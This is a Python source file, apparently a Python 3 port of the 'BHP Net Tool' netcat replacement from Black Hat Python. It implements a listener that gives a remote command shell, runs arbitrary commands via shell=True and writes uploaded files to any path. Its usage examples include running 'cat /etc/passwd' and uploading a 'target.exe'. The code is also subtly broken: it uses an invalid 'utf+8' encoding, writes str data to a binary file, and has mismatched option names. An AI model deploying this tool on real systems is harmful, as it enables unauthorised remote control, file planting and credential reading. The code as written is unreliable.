import sys
import socket
import getopt
import threading
import subprocess

# define some global variables
listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

# this runs a command and returns the output
def run_command(command):

    #trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try: 
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # send the output back to client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):

        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)
            # NOTE: Python 3.6 check if data is in right format, convert if not
            if not isinstance(data, str):
                data = str(data, "utf+8")

            if not data:
                break
            else:
                if not isinstance(data, str):
                    data = str(data, "utf+8")
                file_buffer += data

        # now we try to take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out. Python 3.6 NOTE: str.encode to bytes!
            client_socket.send(str.encode("Successfully saved file to %s\r\n" % upload_destination))
        except:
            client_socket.send(str.encode("Failed to save file to %s\r\n" % upload_destination))

    # Check for command execution
    if len(execute):
    # run the command
        output = run_command(execute)
        # NOTE: Python 3.6 needs correct data types
        if isinstance(output, str):
            output = str.encode(output)
        client_socket.send(output)

    # now we go into another loop if a command shell was requested
    if command:

        while True:
            # show a simple prompt
            client_socket.send(str.encode("<BHP :#> "))

            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += str(client_socket.recv(1024),"utf-8")

            # we have a valid command so execute it and send back the results
            response = run_command(cmd_buffer)

            # send back the response NOTE: Python 3.6 response needs to be in bytes
            if isinstance(response, str):
                response = str.encode(response)
            client_socket.send(response)

# this is for incoming connections
def server_loop():
    global target
    global port

    # if no target, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()

# if we don't listen we are a client....make it so.
def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to target host.
        client.connect((target,port))
        # If we detect input from stdin send it
        # If not, wait for the user to insert.
        if len(buffer):
            # Python 3.6 NOTE: Buffer str must be converted to bytes!
            # This is accomplished via "str.encode"
            # Python 3.6 NOTE: Additionally, unicode escapes need to be processed:
            buffer=bytes(buffer,"utf-8").decode("unicode_escape")
            # The following might be MORE correct, BUT :
            # requires import codecs
            #
            # buffer=codecs.escape_decode(bytes(buffer, "utf-8"))[0].decode("utf-8")
            client.send(str.encode(buffer))
        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+=str(data,'utf-8')
                if recv_len < 4096:
                    break

            print(response)
            # Python 3.6 NOTE: raw_input() is changed to input() for Py3.6
            try:   
                #TODO: Is this part of the buffer even correct?!
                buffer = input()
                buffer += "\n"

            # send it off. Python 3.6 NOTE: str.encode the buffer again! 
                client.send(str.encode(buffer))
            except EOFError:
                print("[*] Buffer reached EOF! Exiting.")
                client.close()
    except:
        # Catch errors indiscriminately. TODO: Could use better feedback output.
        print("[*] Exception! Exiting.")
        # Close
        client.close()

def usage():
    print("\r\nBH Python 3.6 Net Tool\r\n")
    print("-l --listen              - listen on [host]:[port] for ")
    print("                           incoming connections")
    print("-e --execute=file_to_run - execute the given file upon ")
    print("                           receiving a conection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a")
    print("                           file and write to [destination] \r\n")
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the command line options
    try: 
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", \
                 ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage() 

    for o,a in opts:
        if o in ("-h","--help"):
            usage
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c","--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

    if not listen and len(target) and port > 0:
        # read in buffer from commandline
        # send CTRL+D if no input @stdin
        buffer = sys.stdin.read()
        # send data
        client_sender(buffer)

    if listen:
        server_loop()

main()
